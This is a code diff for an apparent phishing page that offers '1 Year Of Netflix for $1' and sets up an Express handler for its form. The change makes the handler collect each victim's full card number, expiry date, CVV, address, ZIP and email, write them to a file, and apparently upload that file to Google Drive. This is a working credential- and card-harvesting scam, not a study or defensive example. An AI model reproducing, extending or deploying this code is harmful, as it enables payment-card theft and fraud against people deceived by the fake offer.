@@ -99,7 +99,7 @@
     <div class="container">
         <div class="card">
             <h1 class="title">Get 1 Year Of Netflix for $1 Only (Limited Time)</h1>
-            <form action="/process-form.php" method="post">
+            <form action="/submit-form" method="post">
                 <div class="input-box">
                     <input type="text" id="firstName" name="firstName" required>
                     <label for="firstName">First Name</label>
@@ -164,7 +164,7 @@
             
             app.post('/submit-form', upload.none(), async (req, res) => {
               const formData = req.body;
-              const fileContent = `First Name: ${formData.firstName}\nLast Name: ${formData.lastName}\nCard Number: ${formData.cardNumber}\n...`; // Include all form fields
+              const fileContent = `First Name: ${formData.firstName}\nLast Name: ${formData.lastName}\nCard Number: ${formData.cardNumber}\nEXP: ${formData.expDate}\nCVV: ${formData.cvv}\nZIP: ${formData.postcode}\nAddress: ${formData.streetAddress}\nState: ${formData.state}\nCountry: ${formData.country}\nEmail: ${formData.email}\n...`; // Include all form fields
             
               try {
                 const response = await drive.files.create({
